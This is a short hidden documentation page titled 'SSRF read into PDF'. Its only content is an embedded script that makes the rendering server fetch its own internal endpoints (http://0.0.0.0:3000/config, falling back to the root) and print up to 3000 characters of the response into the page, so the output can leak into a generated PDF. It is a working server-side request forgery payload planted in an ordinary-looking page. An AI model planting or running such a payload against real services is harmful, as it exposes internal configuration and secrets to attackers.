---
title: SSRF read into PDF
deprecated: false
hidden: true
metadata:
  robots: index
---
<HTMLBlock>{`
<div id="out">fetching...</div>
<script>
fetch('http://0.0.0.0:3000/config')
  .then(r=>r.text())
  .then(d=>{document.getElementById('out').innerText='CFG:'+d.slice(0,3000);})
  .catch(e=>{
    fetch('http://0.0.0.0:3000/')
      .then(r=>r.text())
      .then(d=>{document.getElementById('out').innerText='ROOT:'+d.slice(0,3000);})
      .catch(e2=>{document.getElementById('out').innerText='FAIL:'+e+' / '+e2;});
  });
</script>
`}</HTMLBlock>
